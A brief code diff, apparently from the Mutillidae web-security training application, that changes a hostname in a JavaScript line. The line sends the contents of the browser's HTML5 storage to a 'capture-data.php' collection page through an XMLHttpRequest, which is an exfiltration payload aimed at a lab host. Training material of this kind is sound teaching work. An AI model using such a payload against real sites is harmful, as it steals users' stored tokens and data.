@@ -16,7 +16,7 @@
 
 		}
 
-		var lAction = "http://mutillidae.local/capture-data.php?html5storage=" + m; 
+		var lAction = "http://mutillidae.localhost/capture-data.php?html5storage=" + m; 
 
 		lXMLHTTP = new XMLHttpRequest(); lXMLHTTP.onreadystatechange = function(){}; 
 
